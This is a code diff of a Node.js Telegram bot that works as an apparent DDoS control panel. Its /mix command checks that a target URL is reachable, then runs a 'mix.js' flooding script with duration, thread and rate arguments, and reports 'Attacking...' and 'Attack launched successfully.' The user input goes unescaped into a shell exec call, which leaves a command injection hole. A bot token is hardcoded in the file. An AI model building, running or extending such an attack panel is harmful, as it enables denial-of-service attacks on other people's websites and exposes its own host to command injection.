@@ -5,7 +5,7 @@ const https = require('https');
 const token = '7729532380:AAHQgIrbq7r6T23hhVU0zuE8UmsiEls6x-E';
 const bot = new TelegramBot(token, { polling: true });
 
-// Utils
+// === UTILS ===
 const getManilaTime = () =>
   new Intl.DateTimeFormat('en-PH', {
     timeZone: 'Asia/Manila',
@@ -30,52 +30,58 @@ const getPublicIP = (callback) => {
   });
 };
 
-const logActivity = (msg) => {
-  const user = msg.from;
-  const chat = msg.chat;
-  const command = msg.text.toLowerCase();
-
-  console.log(`Bot Usage Activity:`);
-  console.log(`- User ID: ${user.id}`);
-  console.log(`- Username: ${user.username || 'None'}`);
-  console.log(`- Chat ID: ${chat.id}`);
-  console.log(`- Command: ${command}`);
+const checkHost = (target, callback) => {
+  const url = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
+  https.get(url, (res) => {
+    if (res.statusCode === 200) {
+      callback(true);
+    } else {
+      callback(false);
+    }
+  }).on('error', () => callback(false));
 };
 
-// Command Handlers
+const logActivity = (msg) => {
+  const user = msg.from;
+  const command = msg.text?.toLowerCase();
+  console.log(`[Bot Log] ${user.username || user.id} => ${command}`);
+};
+
+// === COMMAND HANDLERS ===
 const handleStart = (chatId) => {
   const message = `
 Welcome to the Telegram Bot!
 
-Date & Time: ${getManilaTime()}
+Current Time: ${getManilaTime()}
 
-Main Commands:
-/mix [url] [time] [thread] [rate] - Run the mix script
-/show - Show author info and real-time
+Available Commands:
+/mix [url] [time] [thread] [rate]
+/show - Show author and time
 /ip - Show public IP address
-/uid - Show your Telegram ID and username
+/uid - Your Telegram info
 /help - Show all commands
   `;
   bot.sendMessage(chatId, message);
 };
 
 const handleHelp = (chatId) => {
-  const message = `
-Available Commands:
-/start - Start the bot and show menu
-/help - Show this help message
-/show - Show author and current time (Asia/Manila)
-/ip - Show public IP address
-/uid - Show your Telegram ID and username
-/mix [url] [time] [thread] [rate] - Run mix.js with arguments
+  const msg = `
+COMMAND LIST
+───────────────────────────────
+• /start – Start the bot
+• /help – Show this help message
+• /mix [url] [time] [thread] [rate] – Start mix attack
+• /show – Show author info and current time
+• /ip – Show server public IP
+• /uid – Show your Telegram ID
+───────────────────────────────
+Time Zone: Asia/Manila
   `;
-  bot.sendMessage(chatId, message);
+  bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
 };
 
 const handleShow = (chatId) => {
-  const author = "Created by @yourusername";
-  const time = getManilaTime();
-  bot.sendMessage(chatId, `${author}\nCurrent Time (Asia/Manila): ${time}`);
+  bot.sendMessage(chatId, `Created by @yourusername\nTime: ${getManilaTime()}`);
 };
 
 const handleIP = (chatId) => {
@@ -85,53 +91,63 @@ const handleIP = (chatId) => {
 };
 
 const handleUID = (chatId, user) => {
-  bot.sendMessage(
-    chatId,
-    `Your Telegram ID: ${user.id}\nUsername: ${user.username || 'None'}`
-  );
+  bot.sendMessage(chatId, `Your ID: ${user.id}\nUsername: ${user.username || 'None'}`);
 };
 
 const handleMix = (chatId, args) => {
   const [url, time, thread, rate] = args;
 
   if (args.length !== 4 || !url || !time || !thread || !rate) {
-    return bot.sendMessage(
-      chatId,
-      `Invalid format. Use:\n/mix [url] [time] [thread] [rate]`
-    );
+    return bot.sendMessage(chatId, 'Invalid format. Use:\n/mix [url] [time] [thread] [rate]');
   }
 
-  const command = `node mix.js ${url} ${time} ${thread} ${rate}`;
-  exec(command, (error, stdout, stderr) => {
-    if (error || stderr) {
-      console.error(error || stderr);
-      bot.sendMessage(chatId, 'Failed to start process.');
-    } else {
-      console.log(stdout);
-      bot.sendMessage(chatId, 'Process started successfully.');
+  bot.sendMessage(chatId, `Checking target: ${url}...`);
+  checkHost(url, (isUp) => {
+    if (!isUp) {
+      return bot.sendMessage(chatId, `Target ${url} is *not reachable*.`, { parse_mode: 'Markdown' });
     }
+
+    bot.sendMessage(chatId, `
+*Target:* ${url}
+*Time:* ${time}
+*Thread:* ${thread}
+*Rate:* ${rate}
+
+*Status:* Attacking...
+    `, { parse_mode: 'Markdown' });
+
+    exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
+      if (error || stderr) {
+        console.error(error || stderr);
+        bot.sendMessage(chatId, 'Error occurred while starting the process.');
+      } else {
+        console.log(stdout);
+        bot.sendMessage(chatId, 'Attack launched successfully.');
+      }
+    });
   });
 };
 
-// Main Listener
+// === BOT LISTENER ===
 bot.on('message', (msg) => {
   const chatId = msg.chat.id;
-  const text = msg.text?.trim().toLowerCase();
+  const text = msg.text?.trim();
+  const command = text?.toLowerCase();
   const user = msg.from;
 
   if (!text) return;
 
   logActivity(msg);
 
-  if (text === '/start') return handleStart(chatId);
-  if (text === '/help') return handleHelp(chatId);
-  if (text === '/show') return handleShow(chatId);
-  if (text === '/ip') return handleIP(chatId);
-  if (text === '/uid') return handleUID(chatId, user);
-  if (text.startsWith('/mix')) {
-    const args = msg.text.trim().split(' ').slice(1);
+  if (command === '/start') return handleStart(chatId);
+  if (command === '/help') return handleHelp(chatId);
+  if (command === '/show') return handleShow(chatId);
+  if (command === '/ip') return handleIP(chatId);
+  if (command === '/uid') return handleUID(chatId, user);
+  if (command.startsWith('/mix')) {
+    const args = text.split(' ').slice(1);
     return handleMix(chatId, args);
   }
 
-  bot.sendMessage(chatId, 'Unknown command. Type /help to see available commands.');
+  bot.sendMessage(chatId, 'Unknown command. Use /help to see available commands.');
 });
